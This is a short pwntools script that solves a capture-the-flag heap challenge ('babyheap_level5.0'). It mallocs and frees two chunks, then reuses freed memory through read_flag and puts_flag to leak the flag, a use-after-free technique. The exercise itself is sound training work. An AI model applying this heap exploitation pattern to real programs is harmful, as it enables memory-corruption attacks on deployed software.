from pwn import *

p = process("/challenge/babyheap_level5.0")

p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'432')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'432')
p.sendline(b'free')
p.sendline(b'0')
p.sendline(b'free')
p.sendline(b'1')
p.sendline(b'read_flag')
p.sendline(b'free')
p.sendline(b'1')
p.sendline(b'puts_flag')

p.interactive()